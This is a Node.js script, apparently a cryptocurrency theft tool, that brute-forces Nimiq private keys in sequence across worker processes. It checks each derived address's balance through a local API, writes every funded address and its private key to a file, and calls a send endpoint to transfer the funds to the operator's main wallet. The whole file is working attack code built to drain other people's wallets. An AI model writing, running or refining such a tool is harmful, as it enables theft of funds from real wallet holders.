const fs = require('fs');
const cluster = require('cluster');
const { default: axios } = require('axios');
const Wallet = require('./wallet');
const argv = require('minimist')(process.argv.slice(2));

(async () => {
  // args
  const numCPUs = argv?.t || 2;

  // Main
  if (cluster.isMaster) {
    let total = 0;
    let founds = 0;
    const start = "0000000000000000000000000000000000000000000000000000000006576ea5"
    const end = "f".repeat(64)
    const send = async (privateKey) => {
      try {
        const res = await axios.get(`http://127.0.0.1:8088/api/v1/send/${privateKey}`)
        return res.data;
      } catch (error) {
        return null;
      }
    }

    cluster.on('message', async (worker, msg) => {
      const { address, balance, privateKey } = msg;
      total++;
      
      if (balance > 0) {
        founds++;
        console.info(`\x1b[31mChecked: ${total} | Founds: ${founds} | ${address} | B:${balance} NIM`,  '\x1b[34m', `>  ${privateKey}\x1b[0m`);

        // Write to file
        var successString = `Wallet: [${address}]\nPrivate: [${privateKey}]\nBalance: ${balance} NIM\n\n------ Malphite Coder ------\n\n`;
        fs.appendFileSync('./match-private.txt', successString, (err) => console.error(err));

        // Create transaction to main wallet
        await send(privateKey);
      } else {
        console.info(`\x1b[31mChecked: ${total} | Founds: ${founds} | ${address} | B:${balance} NIM`,  '\x1b[34m', `>  ${privateKey}\x1b[0m`);
      }
    })

    for (let i = 0; i < numCPUs; i++) {
      cluster.fork({ START_KEY: `0x${start}`, END_KEY: `0x${end}` });
    }

    cluster.on('exit', (worker, code, signal) => {
      console.log(`Worker ${worker.process.pid} died`);
    });
  } else {
    const getBalance = async (address) => {
      try {
        const res = await axios.get(`http://127.0.0.1:8088/api/v1/balance/${address}`)
        return res.data.balance;
      } catch (error) {
        return await getBalance(address);
      }
    }

    const START_KEY = BigInt(process.env.START_KEY);
    const END_KEY = BigInt(process.env.END_KEY);
    const WORKER_INDEX = Number(cluster.worker.id);

    let founds = 0;
    let start = START_KEY + (BigInt(WORKER_INDEX - 1));

    for (let key = start; key <= END_KEY; key = key + BigInt(numCPUs)) {
      const privateKey = key.toString(16).padStart(64, '0');
      const wallet = Wallet.fromPrivateKey(privateKey)
      const address = wallet.getAddress();
      const balance = await getBalance(address);
      process.send({ address, privateKey, balance })
    }
  }
})()
